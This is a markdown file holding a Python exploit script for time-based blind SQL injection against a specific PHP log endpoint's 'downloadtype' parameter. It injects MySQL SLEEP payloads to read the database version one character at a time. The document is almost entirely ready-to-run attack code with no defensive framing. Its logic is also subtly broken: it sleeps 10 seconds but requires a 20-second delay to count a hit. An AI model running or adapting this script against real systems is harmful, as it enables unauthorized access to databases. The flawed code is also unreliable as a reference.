# Blind SQL Injection
```
import requests
import time

url = "http://X.X.X.X:2004/web/log/dynamic_log.php"

# Function to check if the response time is greater than the specified delay
def is_response_time_delayed(response_time, delay):
    return response_time >= delay

# Function to perform blind SQL injection and check the response time
def perform_blind_sql_injection(payload):
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080',
    }

    params = {
        'target': 'makeMaintainLog',
        'downloadtype': payload
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
        'Connection': 'close'
    }

    start_time = time.time()
    response = requests.get(url, headers=headers, params=params, proxies=proxies)
    end_time = time.time()

    response_time = end_time - start_time
    return is_response_time_delayed(response_time, 20)

# Enumerate the MySQL version
def enumerate_mysql_version():
    version_Name = ''
    sleep_time = 10  # Sleep time is 10 seconds 

    payloads = [
        f"' AND (SELECT IF(ASCII(SUBSTRING(@@version, {i}, 1))={mid}, SLEEP({sleep_time}), 0))-- -"
        for i in range(1, 11)
        for mid in range(256)
    ]

    for payload in payloads:
        if perform_blind_sql_injection(payload):
            mid = payload.split("=")[-1].split(",")[0]
            version_Name += chr(int(mid))

    return version_Name

# Enumeration is completed
version_Name = enumerate_mysql_version()
print("MySQL version is:", version_Name)

```
